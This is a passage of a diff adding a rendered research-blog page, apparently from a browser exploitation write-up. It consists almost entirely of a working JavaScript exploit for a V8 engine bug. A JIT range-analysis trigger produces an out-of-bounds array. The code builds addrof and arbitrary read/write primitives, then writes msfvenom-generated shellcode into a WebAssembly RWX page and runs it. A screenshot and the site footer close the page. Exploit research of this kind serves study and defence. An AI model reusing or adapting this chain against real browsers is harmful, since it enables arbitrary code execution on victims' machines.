+</span></span><span class="line"><span class="cl">	    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>              
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>               
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	  <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	  <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	  <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">trigger</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">oob_arr</span> <span class="o">=</span> <span class="nx">trigger</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">flt_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_arr</span> <span class="o">=</span> <span class="p">[{},</span> <span class="p">{}];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">flt_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob_arr</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob_arr</span><span class="p">[</span><span class="mi">13</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">obj_map</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">flt_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">flt_map</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">flt_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">old_elements</span> <span class="o">=</span> <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mi">2</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">leak</span> <span class="o">=</span> <span class="nx">flt_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">old_elements</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">leak</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">old_elements</span> <span class="o">=</span> <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mi">2</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">flt_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">old_elements</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">		<span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span>
+</span></span><span class="line"><span class="cl">	<span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_instance_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x68</span><span class="nx">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">rwx_page_addr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">wasm_instance_addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="c1">// msfvenom -p linux/x64/exec CMD=&#39;xcalc&#39; --format dword
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">shellcode</span><span class="o">=</span><span class="p">[</span>                 
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x90909090</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x90909090</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x782fb848</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x636c6163</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x48500000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x73752fb8</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x69622f72</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x8948506e</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0xc03148e7</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x89485750</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0xd23148e6</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x3ac0c748</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x50000030</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x4944b848</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x414c5053</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x48503d59</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x3148e289</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x485250c0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0xc748e289</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x00003bc0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="mh">0x050f00</span>
+</span></span><span class="line"><span class="cl">	<span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">f</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">exploit</span><span class="p">();</span></span></span></code></pre></div>
+<img src="/2021-12-25-112106_948x623_scrot.png#center" alt=""></p>
+
+		</div>
+		
+	</main>
+<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+<p>
+	&copy; 2025 <a href="//localhost:1313/">Ignacio Sanmillan Research Blog</a>
+	&#183; CHANGE ME FOOTER COPYRIGHT&#183; Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>
+	&#183; Theme <a href="https://github.com/1bl4z3r/hermit-V2" target="_blank" rel="noopener">Hermit-V2</a></p></footer>
+<script async src="//localhost:1313/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js" integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin="anonymous"></script><script async src="//localhost:1313/js/link-share.min.24409a4f6e5537d70ffc55ec8f9192208d718678cb8638585342423020b37f39.js" integrity="sha256-JECaT25VN9cP/FXsj5GSII1xhnjLhjhYU0JCMCCzfzk=" crossorigin="anonymous"></script>
+</body>
+</html>
